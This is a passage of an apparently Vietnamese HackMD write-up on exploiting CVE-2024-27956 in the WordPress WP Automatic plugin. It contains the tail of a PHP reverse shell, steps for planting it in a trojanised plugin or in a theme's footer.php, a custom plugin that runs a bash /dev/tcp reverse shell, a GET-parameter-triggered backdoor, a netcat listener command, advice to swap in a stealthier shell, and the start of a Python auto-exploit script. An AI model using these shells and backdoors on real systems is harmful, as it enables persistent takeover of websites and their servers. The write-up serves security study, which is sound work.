	<span class="hljs-comment">// data to process's STDIN</span>
	<span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) {
		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK READ"</span>);
		<span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);
		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK: <span class="hljs-subst">$input</span>"</span>);
		fwrite(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);
	}

	<span class="hljs-comment">// If we can read from the process's STDOUT</span>
	<span class="hljs-comment">// send data down tcp connection</span>
	<span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) {
		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT READ"</span>);
		<span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);
		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT: <span class="hljs-subst">$input</span>"</span>);
		fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);
	}

	<span class="hljs-comment">// If we can read from the process's STDERR</span>
	<span class="hljs-comment">// send data down tcp connection</span>
	<span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) {
		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR READ"</span>);
		<span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);
		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR: <span class="hljs-subst">$input</span>"</span>);
		fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);
	}
}

fclose(<span class="hljs-variable">$sock</span>);
fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);
fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);
fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);
proc_close(<span class="hljs-variable">$process</span>);

<span class="hljs-comment">// Like print, but does nothing if we've daemonised ourself</span>
<span class="hljs-comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>{
	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) {
		<span class="hljs-keyword">print</span> <span class="hljs-string">"<span class="hljs-subst">$string</span>\n"</span>;
	}
}

<span class="hljs-meta">?&gt;</span> 
</div></div></code></pre>
      </div><h3 class="part" data-startline="435" data-endline="435" id="Upload-plugin-or-template" data-id="Upload-plugin-or-template"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Upload-plugin-or-template" title="Upload-plugin-or-template" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="11663" data-size="25">Upload plugin or template</span></h3><p class="part" data-startline="437" data-endline="437" data-position="11690" data-size="0"><span data-position="11690" data-size="88">Tải một plugin bất kỳ về máy, ở đây mình chọn plugin classic-editor, unzip và thêm file </span><code data-position="11779" data-size="21">reverse-php-shell.php</code></p><p class="part" data-startline="439" data-endline="439" data-position="11803" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="11803" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/SJKNGcJzR.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="11803" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="441" data-endline="441" data-position="11855" data-size="0"><span data-position="11855" data-size="35">Zip lại và upload plugin lên server</span></p><p class="part" data-startline="443" data-endline="443" data-position="11892" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="11892" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/S1LkQqyz0.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="11892" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="445" data-endline="445" data-position="11944" data-size="0"><span data-position="11944" data-size="124">Mở terminal trên máy lên, ở đây mình sử dụng MacOS nên câu lệnh netcat listener để bắt reverse shell của mình trông như sau:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="447" data-endline="449" data-infoprefix-length="0" data-position="12070"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code>nc -lk 1414
</code></pre>
      </div><p class="part" data-startline="451" data-endline="451" data-position="12091" data-size="0"><span data-position="12091" data-size="99">Sau khi upload thành công và bật netcat listener thì ta có thể truy cập đến file theo đường dẫn sau</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="453" data-endline="455" data-infoprefix-length="0" data-position="12192"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code>/wp-content/plugins/classic-editor/reverse-php-shell.php
</code></pre>
      </div><p class="part" data-startline="457" data-endline="457" data-position="12258" data-size="0"><span data-position="12258" data-size="76">Lúc này file PHP sẽ được thực thi và gửi shell tới IP và port của máy hacker</span></p><p class="part" data-startline="459" data-endline="459" data-position="12336" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="12336" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/rJ31HqJGC.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="12336" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><h3 class="part" data-startline="461" data-endline="461" id="Plugin-file-editor-or-Theme-file-editor" data-id="Plugin-file-editor-or-Theme-file-editor"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Plugin-file-editor-or-Theme-file-editor" title="Plugin-file-editor-or-Theme-file-editor" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="12392" data-size="39">Plugin file editor or Theme file editor</span></h3><p class="part" data-startline="463" data-endline="463" data-position="12433" data-size="0"><span data-position="12433" data-size="89">Dùng chức editor để chỉnh sửa file bất kỳ có sẵn trong wordpress, ở đây có thể chỉnh sửa </span><code data-position="12523" data-size="10">footer.php</code><span data-position="12534" data-size="22"> của template hiện tại</span></p><p class="part" data-startline="465" data-endline="465" data-position="12558" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="12558" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/Hkpt3_lfR.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="12558" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="467" data-endline="467" data-position="12610" data-size="0"><span data-position="12610" data-size="33">Ta có thể copy nội dung của file </span><code data-position="12644" data-size="21">reverse-php-shell.php</code><span data-position="12666" data-size="11"> paste vào </span><code data-position="12678" data-size="10">footer.php</code><span data-position="12689" data-size="46">. Bật netcat listener, sau đó chọn Update File</span></p><p class="part" data-startline="469" data-endline="469" data-position="12737" data-size="0"><span data-position="12737" data-size="62">Quan sát thấy trên terminal đã nhận được shell gửi về từ file </span><code data-position="12800" data-size="10">footer.php</code><span data-position="12811" data-size="1">.</span></p><p class="part" data-startline="471" data-endline="471" data-position="12815" data-size="0"><span data-position="12815" data-size="25">Việc bỏ payload vào file </span><code data-position="12841" data-size="10">footer.php</code><span data-position="12852" data-size="40"> sẽ giúp shell được gửi về mỗi khi file </span><code data-position="12893" data-size="10">footer.php</code><span data-position="12904" data-size="190"> được load. Đồng thời sẽ gây chú ý hơn nhiều vì trang web sẽ đợi khi nào interactive shell kết thúc mới trả về trang web cho người dùng. =&gt; Nên dùng shell này để upload một shell khác ẩn hơn</span></p><h3 class="part" data-startline="473" data-endline="473" id="Tự-tạo-một-plugin-reverse-shell" data-id="Tự-tạo-một-plugin-reverse-shell"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#T%E1%BB%B1-t%E1%BA%A1o-m%E1%BB%99t-plugin-reverse-shell" title="Tự-tạo-một-plugin-reverse-shell" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="13100" data-size="31">Tự tạo một plugin reverse shell</span></h3><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="475" data-endline="487" data-infoprefix-length="4" data-position="13133"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="php hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span></div><div class="code"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/</span>

exec(<span class="hljs-string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1414 0&gt;&amp;1'"</span>);
</div></div></code></pre>
      </div><p class="part" data-startline="489" data-endline="489" data-position="13389" data-size="0"><span data-position="13389" data-size="13">Để biến file </span><code data-position="13403" data-size="21">reverse-php-shell.php</code><span data-position="13425" data-size="102"> thành một plugin ta cần thêm vào đầu file một vài dòng comment. Sau đó zip file lại và upload plugin.</span></p><p class="part" data-startline="491" data-endline="491" data-position="13529" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="13529" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/By8OHFgf0.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="13529" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="493" data-endline="493" data-position="13581" data-size="0"><span data-position="13581" data-size="71">Upload thành công thì bật netcat listener, sau đó chọn activate plugin.</span></p><p class="part in-view" data-startline="495" data-endline="495" data-position="13654" data-size="0"><span data-position="13654" data-size="316">Quan sát thấy shell đã được gửi về. Plugin đã được activate nên bất cứ khi nào trang web được load, shell cũng sẽ được gửi về cho hacker. Đồng thời sẽ gây chú ý hơn nhiều vì trang web sẽ đợi khi nào interactive shell kết thúc mới trả về trang web cho người dùng. =&gt; Nên dùng shell này để upload một shell khác ẩn hơn</span></p><div class="alert alert-info part in-view" data-startline="497" data-endline="506" data-position="13972" data-size="235">
<p data-position="13980" data-size="0"><img class="emoji offline-handled error-handled" alt=":bulb:" src="./Phân tích CVE-2024-27956 - HackMD_files/bulb.png" data-position="13980" data-size="6"><span data-position="13986" data-size="32"> Ta có thể dùng đoạn mã như sau:</span></p>

      <div class="part code-block-wrapper code-block-toolbar-handled" data-startline="500" data-endline="504" data-infoprefix-length="4" data-position="14020"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap php hljs"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'shell'</span>])) {
    exec(<span class="hljs-string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1414 0&gt;&amp;1'"</span>);
}
</code></pre>
      </div>
      
<p data-position="14132" data-size="0"><span data-position="14132" data-size="44">để việc gửi shell về máy hacker khi tham số </span><code data-position="14177" data-size="5">shell</code><span data-position="14183" data-size="20"> được gửi cho server</span></p>
</div><h2 class="part in-view" data-startline="509" data-endline="509" id="Script-auto-exploit" data-id="Script-auto-exploit"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Script-auto-exploit" title="Script-auto-exploit" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="14212" data-size="19">Script auto exploit</span></h2><p class="part in-view" data-startline="511" data-endline="511" data-position="14233" data-size="0"><span data-position="14233" data-size="108">Ở đây mình sẽ viết một đoạn script để thực hiện tất cả các bước khai thác ở trên và trả về interective shell</span></p><ol class="part in-view" data-startline="513" data-endline="519" data-position="14343" data-size="0" style="padding-left: 2em;">
<li class="" data-startline="513" data-endline="513" data-position="14346" data-size="0"><span data-position="14346" data-size="38">Insert user mới (poc:poc) vào database</span></li>
<li class="" data-startline="514" data-endline="514" data-position="14389" data-size="0"><span data-position="14389" data-size="43">Nâng quyền user vừa tạo thành Administrator</span></li>
<li class="" data-startline="515" data-endline="515" data-position="14436" data-size="0"><span data-position="14436" data-size="9">Đăng nhập</span></li>
<li class="" data-startline="516" data-endline="516" data-position="14450" data-size="0"><span data-position="14450" data-size="53">Sử dụng chức năng chỉnh sửa plugin để chỉnh sửa file </span><code data-position="14504" data-size="9">index.php</code><span data-position="14514" data-size="104"> trong plugin WP Automatic (lưu ý phải chỉnh sửa những file có thể truy cập được mà không cần đăng nhập)</span></li>
<li class="" data-startline="517" data-endline="519" data-position="14622" data-size="0"><span data-position="14622" data-size="18">Truy cập đến file </span><code data-position="14641" data-size="9">index.php</code><span data-position="14651" data-size="27"> để kích hoạt reverse shell</span></li>
</ol><div class="part code-block-wrapper code-block-toolbar-handled in-view" data-startline="520" data-endline="587" data-infoprefix-length="7" data-position="14681"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span>
<span data-linenumber="33"></span>
<span data-linenumber="34"></span>
<span data-linenumber="35"></span>
<span data-linenumber="36"></span>
<span data-linenumber="37"></span>
<span data-linenumber="38"></span>
<span data-linenumber="39"></span>
<span data-linenumber="40"></span>
<span data-linenumber="41"></span>
<span data-linenumber="42"></span>
<span data-linenumber="43"></span>
<span data-linenumber="44"></span>
<span data-linenumber="45"></span>
<span data-linenumber="46"></span>
<span data-linenumber="47"></span>
<span data-linenumber="48"></span>
<span data-linenumber="49"></span>
<span data-linenumber="50"></span>
<span data-linenumber="51"></span>
<span data-linenumber="52"></span>
<span data-linenumber="53"></span>
<span data-linenumber="54"></span>
<span data-linenumber="55"></span>
<span data-linenumber="56"></span>
<span data-linenumber="57"></span>
<span data-linenumber="58"></span>
<span data-linenumber="59"></span>
<span data-linenumber="60"></span>
<span data-linenumber="61"></span>
<span data-linenumber="62"></span>
<span data-linenumber="63"></span>
<span data-linenumber="64"></span>
<span data-linenumber="65"></span>
<span data-linenumber="66"></span></div><div class="code"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> hashlib

domain = <span class="hljs-string">"http://localhost:80/wordpress"</span>
listenIP = <span class="hljs-string">"127.0.0.1"</span>
listenPort = <span class="hljs-string">"1415"</span>
wp_automatic_url = domain + <span class="hljs-string">"/wp-content/plugins/wp-automatic/inc/csv.php"</span>
